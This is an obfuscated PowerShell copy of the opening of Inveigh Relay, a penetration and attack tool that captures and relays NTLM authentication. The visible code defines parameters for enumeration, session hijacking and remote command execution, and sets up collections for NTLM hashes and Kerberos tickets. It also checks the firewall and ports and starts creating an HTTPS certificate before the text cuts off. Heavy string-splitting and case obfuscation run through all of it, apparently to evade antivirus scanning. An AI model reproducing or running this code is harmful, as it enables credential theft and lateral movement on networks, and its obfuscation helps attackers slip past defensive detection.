 s`E`T`-VAriABlE  ("C"+"1zjUs") ([Type]("{0}{2}{1}"-F'd','mE','ateTi'));  SET-`V`ARIAbLE KJrLw (  [tyPe]("{1}{0}" -f'AY','ArR')  ) ; se`T-`ITem VArIABle:bWe7do ( [tYPE]("{0}{2}{1}{5}{3}{4}" -f 'Sy','eM.diAGN','sT','iCS.PR','Ocess','OSt')  ) ;set`-i`TEM ("vA"+"rI"+"AB"+"le:2kr"+"a")  ( [TyPe]("{2}{1}{0}"-F 'eRT','Nv','co') )  ;  sEt`-itEM  ("vAri"+"AbLe:2"+"SD"+"c9"+"m")  ( [tYpe]("{1}{0}{2}"-F'R','st','INg') ) ;  $kTB=  [typE]("{6}{5}{4}{0}{3}{1}{2}"-F'p','dRE','Ss','AD','t.I','EM.Ne','sysT') ; $hP0Dw = [tyPE]("{5}{7}{0}{6}{4}{3}{8}{9}{1}{10}{2}" -F 'M.SeCU','.SSlP','lS','a','aUThenTic','sYsT','RITY.','e','Tio','N','ROtOco') ;  S`Et ("4v"+"Xn") (  [TyPE]("{0}{1}{2}" -F'sYstE','M.Conv','erT')); $Xv8QNB  =  [tYpe]("{4}{3}{0}{5}{2}{1}{6}"-f 'Tem.','RtE','e','S','sY','BItCOnV','R'); $iXGd= [type]("{4}{0}{5}{6}{1}{2}{3}" -F 'Te','EXT.eNc','OdI','nG','sys','M.','T');    s`Et ("R"+"kO"+"8f0") ([TYPe]("{1}{0}{2}{3}" -f 'nSp','RU','AcEf','ACtoRY') );SEt`-I`TEm ('v'+'A'+'riable:M4uN') ([TyPe]("{3}{0}{1}{2}"-f'E','L','l','pOWErsh') ) ; sEt`-`ITEM  ('vARia'+'blE'+':aG8N9'+'T') ( [tYpe]("{1}{0}"-f'olE','CoNs')) ;   $P5k = [TYpE]("{1}{2}{0}" -F 'blE','H','ASHtA') ;   SEt-`I`TeM  ("vA"+"R"+"IA"+"bLE:3yV"+"H")  (  [TYPE]("{3}{1}{0}{2}" -f 'Et.','EM.n','dNs','Syst') ) ;S`e`T-itEM  ('VAr'+'Ia'+'BLE:'+'48t7') ([tYpE]("{3}{2}{6}{5}{8}{1}{4}{0}{7}"-F'b','e','yStE','s','m','ON.AS','m.rEfleCti','ly','s')) ;  s`V ("T"+"B1X") (  [tYPe]("{1}{2}{0}{4}{3}"-f'.Io.FI','SySt','EM','e','l')  ); S`Et  ('1'+'np')  (  [TypE]("{0}{1}{4}{6}{3}{5}{2}"-f's','yste','H','GN','M.','oSTICs.sTopWATC','dIA')  );    SE`T-iTEm  variABle:M3Q ( [TYpe]("{0}{1}"-F 'ma','tH')  );function I`NvOK`E-iN`VeiGh`ReL`AY
{






[CmdletBinding()]
param
( 
    [parameter(mANDAtOry=${F`A`LSE})][ValidateSet({"{0}{1}" -f'Enum','erate'},{"{1}{2}{0}"-f'ion','S','ess'},{"{2}{0}{1}"-f'xecut','e','E'})][Array]${ATta`cK} = (("{2}{1}{0}"-f'ate','mer','Enu'),("{0}{2}{1}"-f 'S','on','essi')),
    [parameter(MaNDatOrY=${FAL`sE})][ValidateSet("All",{"{0}{1}{2}" -f'NetSess','io','n'},{"{1}{0}" -f 'are','Sh'},{"{0}{1}"-f'Us','er'},{"{1}{0}"-f'up','Gro'})][String]${E`NuMeR`ATe} = "All",
    [parameter(mandAtOry=${Fa`LSe})][ValidateSet({"{0}{1}" -f'Ra','ndom'},{"{2}{1}{0}" -f't','ic','Str'})][String]${tARgEt`MO`DE} = ("{1}{0}" -f'om','Rand'),
    [parameter(MANDATORy=${F`ALSE})][String]${e`NuMErA`TegR`OuP} = ("{3}{1}{2}{4}{0}"-f 's','nistra','t','Admi','or'),
    [parameter(MANdAToRY=${F`AlSE})][Array]${DOMaINmA`p`p`iNG} = "",
    [parameter(mandaTorY=${f`A`lSE})][Array]${ta`R`GEt} = "",
    [parameter(MaNdatORy=${F`AlSe})][Array]${t`ARGeTE`xc`lu`de} = "",
    [parameter(mANdaToRY=${FA`lse})][Array]${PROXY`Igno`Re} = ("{1}{0}" -f'irefox','F'),
    [parameter(mandAtoRY=${F`AL`SE})][Array]${us`e`RNAME} = "",
    [parameter(mANdatOry=${Fal`Se})][Array]${wPA`dAUThIGNo`RE} = "",
    [parameter(mANDaTorY=${Fal`Se})][Int]${cONSOL`Equ`eu`e`Lim`IT} = "-1",
    [parameter(MaNDATorY=${faL`se})][Int]${CoNS`OLE`sta`TUS} = "",
    [parameter(MaNdaTORY=${FAL`se})][Int]${f`A`ILedl`oG`InthresHolD} = "2",
    [parameter(MAndAToRY=${FAL`se})][Int]${htTP`PO`Rt} = "80",
    [parameter(MAnDaTorY=${fA`lSe})][Int]${h`TtP`spO`Rt} = "443",
    [parameter(manDatoRy=${FA`LSE})][Int]${Pr`OX`ypoRT} = ("{0}{1}"-f'84','92'),
    [parameter(mAnDaToRy=${F`ALse})][Int]${R`UNTi`me} = "",
    [parameter(mandATorY=${f`AL`sE})][Int]${S`ES`s`iOnLIm`itPRiV} = "2",
    [parameter(MAndATorY=${Fa`LsE})][Int]${S`e`SsIoN`LImITSha`RE} = "2",
    [parameter(MANdATOrY=${FaL`sE})][Int]${seS`s`IoNLIMITUnp`R`iv} = "0",
    [parameter(mANdaTorY=${fA`lSE})][Int]${seSS`iONr`efRe`sH} = "10",
    [parameter(ManDatorY=${FAL`se})][Int]${TA`Rge`TREfReSH} = "60",
    [parameter(maNDaToRy=${F`ALSE})][Int]${R`eP`eAtE`NumeRatE} = "30",
    [parameter(mANdatoRY=${FaL`sE})][Int]${r`ePEATexeCU`TE} = "30",
    [parameter(MandAtORy=${FaL`Se})][String]${c`oMM`And} = "",
    [parameter(mAnDATORy=${fal`se})][String]${H`TTp`sCeRt`IsSU`Er} = ("{1}{0}"-f 'h','Inveig'),
    [parameter(MANDATOrY=${fA`l`se})][String]${h`TTPSCERT`subj`eCT} = ("{2}{0}{1}"-f'ca','lhost','lo'),
    [parameter(ManDAtOry=${fA`LSe})][String]${s`Er`ViCe},
    [parameter(MANdATOry=${FAL`Se})][ValidateSet("Y","N")][String]${conSOLEUn`Iq`UE} = "Y",
    [parameter(MANdAtORY=${fa`LsE})][ValidateSet("Y","N")][String]${faI`lEdLO`GIN`STRI`ct} = "N",
    [parameter(mANdAtOrY=${fA`l`se})][ValidateSet("Y","N")][String]${F`il`EOUtpUt} = "N",
    [parameter(maNDAtoRy=${FAL`SE})][ValidateSet("Y","N")][String]${f`ilEUn`IQ`Ue} = "Y",
    [parameter(MaNdatORy=${fA`L`se})][ValidateSet("Y","N")][String]${hT`Tp} = "Y",
    [parameter(MANDATOry=${f`A`lse})][ValidateSet("Y","N")][String]${H`T`TpS} = "N",
    [parameter(MAnDaTOrY=${fAL`sE})][ValidateSet("Y","N")][String]${HTtpsfOrcECEr`TD`E`leTe} = "N",
    [parameter(ManDaTOry=${FAL`sE})][ValidateSet("Y","N")][String]${l`ogO`U`TPUT} = "Y",
    [parameter(mAndAtOrY=${FaL`se})][ValidateSet("Y","N")][String]${mAChi`NEaccO`U`NTS} = "N",
    [parameter(MaNdaTorY=${Fa`lSe})][ValidateSet("Y","N")][String]${O`UtPUt`STRE`AMonly} = "N",
    [parameter(MANdAtORY=${F`Al`Se})][ValidateSet("Y","N")][String]${PR`oxY} = "N",
    [parameter(manDAtOry=${Fa`LsE})][ValidateSet("Y","N")][String]${r`ELa`yA`UT`ODiSaBLe} = "Y",
    [parameter(ManDAToRy=${F`AL`SE})][ValidateSet("Y","N")][String]${r`eLA`Y`AutOE`XIT} = "Y",
    [parameter(mANdatOry=${F`AL`sE})][ValidateSet("Y","N")][String]${sess`ION`p`RiORITY} = "Y",
    [parameter(manDATORY=${f`ALsE})][ValidateSet("Y","N")][String]${Sh`OWh`ELP} = "Y",
    [parameter(MaNDAtORY=${fa`LsE})][ValidateSet("Y","N")][String]${sTaRtuP`c`He`cks} = "Y",
    [parameter(maNDaToRy=${fa`LSE})][ValidateSet("Y","N")][String]${STa`Tus`OUT`put} = "Y",
    [parameter(MAnDaTOrY=${fA`lSE})][ValidateSet("Y","N","Low",{"{2}{0}{1}" -f 'edi','um','M'})][String]${conSo`lEO`UT`P`UT} = "N",
    [parameter(MaNDaTORY=${Fal`se})][ValidateSet("0","1","2")][String]${To`Ol} = "0",
    [parameter(MAndAtoRy=${F`AL`Se})][ValidateSet({"{1}{2}{0}"-f 'us','Anon','ymo'},{"{1}{0}"-f 'TLM','N'})][String]${Wp`A`d`Auth} = ("{0}{1}"-f 'N','TLM'),
    [parameter(mAnDAToRY=${FA`LsE})][ValidateScript({T`EsT-P`Ath ${_}})][String]${f`Il`eOuTpU`TD`IrECto`RY} = "",
    [parameter(mANDatORY=${F`AlSE})][ValidatePattern('^[A-Fa-f0-9]{16}$')][String]${cha`lLe`NGe} = "",
    [parameter(MandatoRY=${fa`lse})][ValidateScript({${_} -match [System.Net.IPAddress]${_}})][String]${HT`Tpip} = ("{2}{1}{0}" -f'0','0.0.','0.'),
    [parameter(maNdaTOry=${fA`lsE})][ValidateScript({${_} -match [System.Net.IPAddress]${_}})][String]${p`ROx`YIp} = ("{0}{1}" -f '0.0.0.','0'),
    [parameter(ValUEfRomRemaINiNGArGUMEnTs=${tR`UE})]${in`VA`lID_paR`AMeTer}
)




if (${i`NvAlId_p`ARa`M`eteR})
{
    wR`ITE-`outpUT "[-] $($invalid_parameter) is not a valid parameter. "
    throw
}

if(${iN`VE`iGh}."r`ELaY_ru`N`NINg")
{
    w`RIte`-outpuT ("{0}{4}{2}{5}{6}{3}{1}{8}{7}"-f'[-','ady run','Inveigh','alre','] ',' Relay',' is ','ing','n')
    throw
}

${inV`eIgH`_vEr`sI`ON} = ("{0}{1}" -f '1.50','1')

if(!${Ta`R`gEt} -and !${INv`EiGh}."E`Nume`R`ATE")
{
    Writ`e-O`U`TPut ("{0}{2}{7}{6}{3}{4}{1}{5}{9}{8}" -f'[-] ','ecify target','No e','ata',', sp','s wi','rget d','numerated ta','et','th -Targ')
    throw
}

if(${PROx`y`iP} -eq ("{0}{1}" -f'0.0.0.','0'))
{

    try
    {
        ${PROXY_`wpA`D_iP} = (t`E`St`-cONneCTI`on ("{0}{3}{2}{1}"-f'127','1','0.','.0.') -count 1 | seLeCT`-`o`BjeCT -ExpandProperty ("{2}{3}{0}{1}"-f 's','s','I','pv4Addre'))
    }
    catch
    {
        wri`TE-O`UTP`Ut ("{8}{13}{6}{12}{3}{4}{14}{10}{2}{9}{7}{11}{16}{5}{15}{0}{1}" -f 'o','xyIP','pec','oxy I','P','h -P','ror fi','l','[-] E','ify manua','s','ly','nding pr','r',', ','r',' wit')
        throw
    }

}

if(${aTTA`CK} -contains ("{1}{0}{2}"-f'u','Exec','te') -and !${COM`MA`Nd})
{
    wr`ItE`-`OUTpUt ("{1}{11}{2}{5}{9}{0}{8}{7}{12}{6}{10}{3}{4}" -f'req','[-','n',' with -Attack',' Execute','d','e','i','u',' ','d','] -Comma','r')
    throw
}

if(${doM`AINmAP`PI`Ng})
{

    if(${Do`MaiNMAp`p`InG}."co`UNt" -ne 2 -or ${D`O`ma`InmApPInG}[0] -like "*.*" -or ${do`maIN`MApp`i`NG}[1] -notlike "*.*")
    {
        wrIte-OU`T`p`UT ("{3}{4}{8}{5}{7}{6}{1}{0}{2}{9}" -f's inc','mat i','orrec','[-] ','-','ainMa',' for','pping','Dom','t')
        throw
    }
    
}

if(!${fi`L`eoutPutdIre`cto`RY})
{ 
    ${outP`U`T`_D`IrECtOry} = ${p`wd}."p`AtH"
}
else
{
    ${outP`UT`_DiR`ECTO`Ry} = ${filEouT`PU`TdIrEc`T`ORY}
}

if(!${INv`Ei`GH})
{
    ${GLoBal:in`V`EIGh} =   $p5k::("{3}{0}{2}{1}" -f'ynchr','nized','o','S').Invoke(@{})
    ${InvE`I`gh}."cle`Ar`Tex`T_lI`st" = NeW`-o`BJ`eCt ("{4}{5}{3}{0}{2}{1}"-f'ectio','ist','ns.ArrayL','oll','Syste','m.C')
    ${I`NVEI`GH}."enUme`R`A`TE" = NeW`-`oBjecT ("{3}{4}{2}{1}{6}{0}{5}"-f'Lis','r','.Collections.Ar','Syste','m','t','ay')
    ${i`NV`EiGh}."I`P_cA`PTuRE`_LisT" = New-Ob`J`ect ("{3}{1}{0}{5}{6}{2}{4}"-f'm.Collections','ste','rayLis','Sy','t','.','Ar')
    ${IN`V`EIGh}."L`og" = new-`o`Bject ("{4}{6}{8}{7}{0}{2}{3}{1}{5}" -f'ect','ayLis','ion','s.Arr','Syst','t','e','oll','m.C')
    ${Inv`e`IgH}."KERbEro`S_tG`T`_L`ISt" = new-`Ob`jeCt ("{3}{6}{5}{0}{2}{1}{7}{4}" -f'.','rr','A','Syste','ist','lections','m.Col','ayL')
    ${iNvEi`Gh}."kEr`Ber`Os_T`gT`_US`eR`NaM`E_li`st" = n`EW-`ObJect ("{4}{2}{0}{5}{1}{3}" -f 'ions.','ayL','Collect','ist','System.','Arr')
    ${Inv`Ei`gH}."N`TlMV1_li`st" = n`EW-OBJ`e`Ct ("{5}{2}{4}{1}{6}{3}{0}" -f 't','l','stem.C','ions.ArrayLis','ol','Sy','ect')
    ${iNv`eI`Gh}."nTlMv`1_u`s`Er`NaM`E_lIST" = NEw-O`BJE`cT ("{5}{3}{2}{0}{4}{1}"-f'ns.Array','st','o','ollecti','Li','System.C')
    ${IN`V`EiGH}."Ntl`mv`2_List" = n`ew-o`BJecT ("{6}{5}{3}{0}{4}{1}{2}" -f's','yLis','t','.Collection','.Arra','tem','Sys')
    ${I`Nv`eigH}."ntLmv2_`USE`R`Name_LISt" = New-OB`Je`Ct ("{5}{4}{6}{2}{3}{1}{0}"-f 'ist','yL','llections.','Arra','ys','S','tem.Co')
    ${iNV`e`igh}."p`Ost_`REQ`UE`ST_lIST" = new-`O`BjecT ("{7}{8}{4}{0}{6}{2}{1}{3}{5}"-f'i','.A','ns','rrayL','t','ist','o','Syst','em.Collec')
    ${I`NVe`IgH}."vA`l`Id_HoST_Li`St" = nEW-O`BJe`cT ("{7}{4}{3}{0}{1}{2}{6}{5}"-f'l','ec','tions','tem.Col','s','ArrayList','.','Sy')
    ${i`N`VEigh}."adI`Dns`_`TABLE" =  ( D`Ir VARiablE:p5k  ).VAlue::("{3}{0}{1}{2}"-f'r','oni','zed','Synch').Invoke(@{})
    ${InV`e`IGH}."rEl`AY_`pRiv`iLEge_tA`BLE" =  $P5k::("{3}{2}{0}{1}" -f'nchroniz','ed','y','S').Invoke(@{})
    ${I`NvEI`gh}."rel`AY_f`AiLEd_Log`IN`_`T`AbLe" =   $P5K::("{2}{1}{0}" -f'd','nchronize','Sy').Invoke(@{})
    ${Inv`e`iGH}."r`ELAY_HistoRY_tA`B`le" =  ( Get-`Va`RIAblE  p5K -VAluEo )::("{0}{1}{2}"-f'Synch','ro','nized').Invoke(@{})
    ${Inv`E`Igh}."reqUe`s`T_`TA`BLE" =  (  V`ARI`ABLe  ('P'+'5K')  ).VaLUe::("{2}{0}{1}"-f 'h','ronized','Sync').Invoke(@{})
    ${INV`eigh}."SeSs`iON_sO`CkEt_`TA`BLe" =  ( gET`-CHi`lDI`Tem  VARIABlE:P5K).vALUE::("{3}{1}{2}{0}"-f 'd','oni','ze','Synchr').Invoke(@{})
    ${i`NvEI`gh}."seS`sIon`_Tab`LE" =   (V`ARi`ABlE p5K -vA)::("{1}{2}{0}"-f 'ized','S','ynchron').Invoke(@{})
    ${INv`Ei`gh}."SE`sSIo`N_`mE`sSaGe_id_t`AB`Le" =   $p5K::("{0}{1}{2}" -f'Sync','h','ronized').Invoke(@{})
    ${iN`VeiGh}."sessi`on_L`OCk`_TaBlE" =   (gi VarIabLE:p5K ).vALuE::("{1}{2}{0}" -f'zed','Sync','hroni').Invoke(@{})
    ${INVeI`GH}."S`mB`_sEssiON`_TablE" =   $p5k::("{1}{0}{2}"-f'on','Synchr','ized').Invoke(@{})
    ${iN`VE`IgH}."dOMAiN_`MaPpI`NG_t`ABLE" =  (g`CI variabLE:P5K).VALUE::("{3}{2}{1}{0}"-f'ized','hron','c','Syn').Invoke(@{})
    ${IN`V`eiGh}."gR`oUp`_TA`Ble" =  (V`A`RIABlE  p5k  ).VALUe::("{1}{0}{2}" -f 'niz','Synchro','ed').Invoke(@{})
    ${Invei`gH}."seS`si`oN_couNT" = 0
    ${I`NvEi`gh}."SEss`Ion" = @()
}

${i`N`VeiGH}."ST`OP" = ${F`AL`SE}

if(!${I`NVe`Igh}."r`Un`NInG")
{
    ${IN`V`eIgh}."ClEarteXT_fil`e`_`q`U`euE" = New-`objE`CT ("{5}{0}{2}{3}{4}{6}{1}"-f 'Colle','ist','ctio','ns.A','rr','System.','ayL')
    ${i`N`VeIGH}."Co`NS`O`LE_qUeuE" = nEw`-o`BJECt ("{4}{7}{2}{0}{3}{5}{6}{1}"-f 'tem.Co','t','s','ll','S','ectio','ns.ArrayLis','y')
    ${inVE`I`GH}."l`og_FiL`e_qU`EuE" = NeW-`OB`ject ("{2}{3}{1}{4}{0}{5}{6}"-f 'llect','em.','Sy','st','Co','ion','s.ArrayList')
    ${iN`V`EIgH}."NT`LM`V1`_fiLE`_`queue" = ne`w`-ObJect ("{4}{8}{6}{5}{3}{0}{7}{1}{2}" -f'.A','y','List','ons','Syst','i','llect','rra','em.Co')
    ${I`N`VEIgh}."N`TLMV`2_fIle_`QueUE" = new-`O`BJect ("{4}{5}{6}{0}{3}{2}{1}" -f 'cti','st','yLi','ons.Arra','Syst','em.Coll','e')
    ${I`NV`EIgh}."outp`UT_Q`UE`UE" = NEw`-ObJ`ECT ("{3}{7}{2}{6}{4}{1}{5}{0}{8}" -f 'ray','s.A','l','System.','n','r','ectio','Col','List')
    ${iNv`EI`GH}."P`OST_Re`qUES`T_FILe`_QU`e`UE" = neW`-Ob`Ject ("{6}{2}{3}{0}{1}{5}{4}"-f'llectio','n','tem.','Co','ayList','s.Arr','Sys')
    ${INVe`Igh}."H`TtP_`sesSIoN_tab`le" =   $p5K::("{2}{1}{0}{3}" -f'onize','chr','Syn','d').Invoke(@{})
    ${iN`VEI`gh}."CoN`SOLE_In`PUT" = ${T`RUe}
    ${i`NveI`gh}."cON`SOLe_O`UT`puT" = ${fa`Lse}
    ${I`Nv`eIGh}."fIle_out`p`Ut" = ${fA`LSe}
    ${I`N`VeIGh}."h`T`TpS_`eXI`StInG_`cert`i`FiCAtE" = ${F`AL`sE}
    ${iNVe`I`gh}."H`TtPS_`F`o`R`Ce_c`ert`IFIcAt`E`_deLEte" = ${fal`sE}
    ${in`VEi`gh}."lOg_`o`Utp`UT" = ${t`RUe}
    ${iN`VEi`Gh}."cL`eA`RTExt_`o`UT_fIlE" = ${OUtPu`T_`dIR`ecToRY} + ((("{1}{3}{7}{4}{2}{6}{0}{5}"-f 't','hz','ex','nInv','art','xt','t.','eigh-Cle'))."r`Ep`lace"(([ChAr]104+[ChAr]122+[ChAr]110),[StRiNg][ChAr]92))
    ${IN`Ve`IgH}."LO`g_o`Ut_F`iLE" = ${oU`TpUt_d`iR`e`ctO`RY} + ((("{0}{3}{2}{5}{4}{1}" -f '5','g.txt','igh','tQInve','o','-L'))."rePL`A`CE"(([cHaR]53+[cHaR]116+[cHaR]81),'\'))
    ${INve`iGh}."n`TLMV`1`_`oUT_fiLe" = ${o`UT`puT_D`i`R`eCtorY} + ((("{4}{2}{3}{1}{0}"-f'txt','Mv1.','h','-NTL','iuIInveig')) -creplAce'iuI',[chaR]92)
    ${in`V`EiGH}."NTlM`V2_O`UT`_`FIle" = ${Ou`TpUT`_DI`R`Ectory} + ((("{1}{4}{2}{3}{0}" -f 'Mv2.txt','7RQ','-NT','L','Inveigh')).("{0}{2}{1}" -f 'rEP','ace','l').Invoke('7RQ','\'))
    ${InVeI`gh}."poST_`R`EQuE`sT_oUT`_`FI`Le" = ${oUTPuT_d`I`ReC`T`orY} + ((("{3}{4}{1}{2}{0}" -f '.txt','p','ut','SA9In','veigh-FormIn'))-cRepLAcE 'SA9',[ChAr]92)
}

if(${ST`ARt`UPCHecks} -eq 'Y')
{

    ${fIr`ew`ALL`_sta`TuS} = NE`TSH ("{0}{2}{1}"-f'advfire','l','wal') ("{0}{1}" -f'sh','ow') ("{0}{2}{3}{1}"-f'a','es','llpr','ofil') ("{0}{1}"-f 'st','ate') | Wh`eR`e`-obJECt {${_} -match 'ON'}

    if(${h`TTp} -eq 'Y')
    {
        ${htt`P`_pOrT_cH`ECK} = neTSt`AT -anp ("{0}{1}" -f'T','CP') | FINDs`Tr ("{1}{0}" -f'ISTENING','L') | f`iNds`TR (("{2}{7}{4}{3}{1}{6}{5}{0}" -f ' ','IP','/','P','T','TPPort',':fsQHT','C:fsQHT'))."RE`Pl`ACe"('fsQ',[StRiNG][CHaR]36)
    }

    if(${hTT`Ps} -eq 'Y')
    {
        ${htTPs_P`oRT_c`H`EcK} = netS`Tat -anp ("{1}{0}" -f 'P','TC') | Fi`NDSTr ("{0}{2}{1}" -f 'LISTEN','NG','I') | fiN`dsTR ((("{4}{0}{3}{2}{1}{6}{5}" -f '{','PIP:{','TT','0}H','/C:','}HTTPSPort ','0')) -F[CHaR]36)
    }

    if(${P`Roxy} -eq 'Y')
    {
        ${pR`ox`y`_po`Rt_CHeCk} = n`ET`Stat -anp ("{1}{0}"-f'P','TC') | fiN`ds`Tr ("{0}{1}{2}" -f 'L','ISTE','NING') | FIND`STr ((("{2}{3}{4}{1}{0}" -f 'xyPort ','PIP:JNaPro','/C',':JNaH','TT')) -crEplacE  ([CHAR]74+[CHAR]78+[CHAR]97),[CHAR]36)
    }

}

${Inv`e`Igh}."rEla`Y_RuNN`Ing" = ${t`Rue}
${inve`Igh}."SMb`_Re`lay" = ${tR`Ue}

if(${stATu`SoUT`PUt} -eq 'Y')
{
    ${i`NV`eIGh}."Status`_Ou`TPUt" = ${t`RUE}
}
else
{
    ${i`Nve`igH}."staT`U`S_OU`TpuT" = ${fa`LsE}
}

if(${OUTpu`TStr`e`A`monLy} -eq 'Y')
{
    ${I`NVe`igh}."OuTPu`T`_sTr`eam_OnLY" = ${Tr`Ue}
}
else
{
    ${inVe`IgH}."oUt`Put`_sTRE`AM_o`NLY" = ${F`AL`sE}
}

if(${To`ol} -eq 1) 
{
    ${I`NveIgh}."to`OL" = 1
    ${INv`e`IGh}."ouTP`UT_S`TRea`M_O`NLy" = ${TR`Ue}
    ${I`N`Veigh}."N`ewli`NE" = ${Nu`lL}
    ${c`oN`SO`l`EoutpUt} = "N"
}
elseif(${to`OL} -eq 2) 
{
    ${in`VE`iGH}."to`OL" = 2
    ${in`Ve`igh}."ou`TPUt_stReAM_O`N`ly" = ${T`Rue}
    ${i`NV`Eigh}."CO`Nso`lE_inPUT" = ${F`AlSE}
    ${In`Vei`gH}."new`li`Ne" = ${nU`LL}
    ${l`o`GOuTPUt} = "N"
    ${sH`OWhe`lP} = "N"

    switch (${C`O`NSoleo`U`TPuT})
    {

        'Low'
        {
            ${Console`o`UTpuT} = "Low"
        }

        ("{1}{0}"-f 'dium','Me')
        {
            ${Co`NSoleOUt`Put} = ("{0}{1}"-f'Medi','um')
        }

        ("{0}{1}{2}" -f'd','efau','lt')
        {
            ${cON`so`Leou`TPut} = "Y"
        }

    }

}
else
{
    ${iNvE`I`Gh}."TO`oL" = 0
    ${InV`E`IGh}."NeW`LiNe" = ${nu`Ll}
}



${i`NvEI`GH}."oU`T`pUt_QUeue"."A`Dd"(("[*] Inveigh Relay $inveigh_version started at $(Get-Date -format s) ")) > ${N`UlL}

if(${FIrEw`A`ll_`s`TatUS})
{
    ${IN`V`EIGH}."ou`TP`U`T_queUe"."a`dD"(("{1}{5}{2}{0}{4}{6}{7}{3}"-f'ows Fire','[','nd','ed','w','!] Wi','all',' = Enabl'))  > ${N`ULL}
}

if(${Ht`TP} -eq 'Y')
{

    if(${hT`T`p_pO`RT_ch`ecK})
    {
        ${Ht`Tp} = "N"
        ${i`NVEIgH}."O`Utp`Ut_qUEue"."A`dD"(('[-'+'] '+'HT'+'TP '+'C'+'apture/Rel'+'a'+'y '+'Disab'+'led'+' '+'D'+'ue '+'To'+' '+'I'+'n '+'Us'+'e '+'Port'+' '+"$HTTPPort"))  > ${NU`ll}
    }
    else
    {
        ${I`Nv`eigh}."output`_Q`UEUe".("{1}{0}" -f 'dd','A').Invoke(("{5}{2}{0}{3}{1}{4}{7}{6}{8}" -f'T','Captu','+] HT','P ','re/Rel','[',' =','ay',' Enabled'))  > ${NU`ll}

        if(${h`TtpIP})
        {
            ${INv`Ei`gH}."o`UTPut_q`UE`Ue"."A`dd"(('[+'+'] '+'HTTP'+' '+'IP'+' '+'Addre'+'ss '+'= '+"$HTTPIP")) > ${NU`LL}
        }

        if(${Ht`TpPo`Rt} -ne 80)
        {
            ${INV`eIgH}."oU`TPU`T_`qUEue"."A`dd"(('[+]'+' '+'HTT'+'P '+'Po'+'rt '+'= '+"$HTTPPort")) > ${N`ULL}
        }
    }

}
else
{
    ${Inve`I`gH}."o`UTPuT_q`U`eue".("{0}{1}" -f'A','dd').Invoke(("{6}{2}{0}{8}{9}{1}{3}{7}{5}{4}"-f 'a','R','P C','elay ','abled',' Dis','[+] HTT','=','pture','/'))  > ${NU`lL}
}

if(${H`TTps} -eq 'Y')
{

    if(${htT`pS_PO`RT_Ch`ECK})
    {
        ${ht`TPs} = "N"
        ${inv`E`igH}."h`TtPs" = ${f`Al`Se}
        ${i`NVeI`gH}."oU`Tpu`T_QUE`UE"."A`dd"(('[-]'+' '+'HTT'+'P'+'S '+'Capt'+'ure/R'+'elay '+'Disab'+'led'+' '+'Due'+' '+'To'+' '+'In'+' '+'Us'+'e '+'Po'+'rt '+"$HTTPSPort"))  > ${N`UlL}
    }
    else
    {

        try
        {
            ${iNvE`iGh}."CER`Ti`FICAt`e`_IS`sueR" = ${Htt`PSc`eRT`I`sSU`eR}
            ${InV`E`iGH}."C`ERTIFIcAT`e_cN" = ${h`TtpSCeRTS`UBJ`ECT}
            ${I`NvE`Igh}."oU`TpU`T_QU`EuE".("{0}{1}"-f 'A','dd').Invoke(("{5}{4}{3}{0}{1}{2}"-f 'ficate I','s','suer = ','rti',' HTTPS Ce','[+]') + ${iNV`EI`gH}."C`ErtIFicAt`E_isSU`Er")  > ${nU`LL}
            ${INV`EIgH}."oUtpU`T_qu`eUe"."a`dd"(("{2}{1}{3}{0}{4}{5}" -f 'Ce','+]','[',' HTTPS ','rtif','icate CN = ') + ${INvE`igH}."cE`RtIFica`T`E`_Cn")  > ${n`Ull}
            ${CeRt`if`i`ca`TE_`checK} = (Get-`c`hIL`ditEm (("{6}{5}{4}{2}{1}{3}{0}"-f 'OkMy','lMachin','a','e2',':2OkLoc','ert','C'))."re`PL`ACe"(([CHar]50+[CHar]79+[CHar]107),'\') | WherE-O`BJ`E`CT {${_}."is`sUeR" -match ${iN`VEI`gh}."CE`R`TificA`TE_IsS`U`eR"})

            if(!${cErtI`F`icAte_c`HecK})
            {
                
                ${CerTiFIcA`TE_disTIN`GUI`SH`Ed_`N`A`me} = new`-o`B`ject -com ("{3}{4}{6}{5}{0}{7}{1}{2}" -f'inguis','edNam','e','X509Enrol','lme','00Dist','nt.CX5','h')
                ${CerTi`FICate_`DIs`T`iNgUishEd`_N`A`Me}.("{1}{0}"-f 'ncode','E').Invoke( "CN=" + ${INv`EI`gh}."C`Er`TiFIcatE_`CN", ${CERtiFICa`T`e_Di`sTI`N`g`U`IsheD_`N`AME}."X500`Na`MeflaGS"."x`500NaM`efLagS"."xCN_`c`e`Rt`_NamE_`Str_NONE")
                ${ce`RTiFICAT`E_`issUe`R`_DistiNGUi`sHeD_NaMe} = neW`-`ObJECT -com ("{1}{4}{5}{0}{7}{3}{2}{6}"-f'X50','X509E','edNam','istinguish','nrollmen','t.C','e','0D')
                ${cERtI`FICA`Te`_Is`SuEr_D`i`STINgUIShed_NAME}.("{2}{0}{1}"-f'nco','de','E').Invoke("CN=" + ${iNVeI`GH}."C`erT`ifIc`AtE_`iS`sUer", ${cErt`if`ic`ATE_d`is`TinGUisheD`_`NAMe}."X500Na`mefl`AgS"."x500`Na`meflA`gs"."xcN_`ce`RT_n`AME_S`TR_nONe")
                ${C`ER`TIFiCA`Te_k`ey} = NEW-Obj`E`cT -com ("{6}{1}{2}{0}{3}{8}{7}{4}{5}" -f 'Enrol','5','09','l','09P','rivateKey','X','5','ment.CX')
                ${ceRti`Fi`caT`e`_kEy}."PRO`VIdErn`A`Me" = ("{1}{6}{10}{9}{8}{15}{0}{7}{12}{14}{11}{3}{13}{2}{5}{4}" -f'A','Micros','v','c P','der','i','o','ES','ced RS','han','ft En','hi',' Crypt','ro','ograp','A and ')
                ${CE`RtIF`IC`At`e_KEy}."ke`Ys`PeC" = 2
                ${CeRTI`FI`Ca`T`e_Key}."LEN`g`Th" = 2048
			    ${cEr`TiFic`A`T`E`_key}."maCh`INeCON`T`E`Xt" = 1
                ${cErTiFiC`A`T`E_`keY}.("{1}{0}" -f 'ate','Cre').Invoke()
                ${CE`RTIfIC`A`TE_SErveR_Aut`h_`oiD} = n`ew-`OBjeCt -com ("{5}{3}{4}{1}{6}{0}{2}"-f 'b','me','jectId','nro','ll','X509E','nt.CO')
			    ${c`e`RT`iFICAt`e_SE`R`VeR_A`UTH_oid}.("{0}{1}{2}{4}{3}"-f 'Initi','alize','F','e','romValu').Invoke(("{0}{1}{2}{4}{3}" -f'1.','3.','6.1.5.5.','.1','7.3'))
			    ${ce`R`TIFicAte_enHanc`ED`_`kEy_`USAGe_oid} = NEw`-o`BjeCt -com ("{5}{4}{0}{3}{1}{2}{6}" -f'l','ent','.CObjec','m','09Enrol','X5','tIds.1')
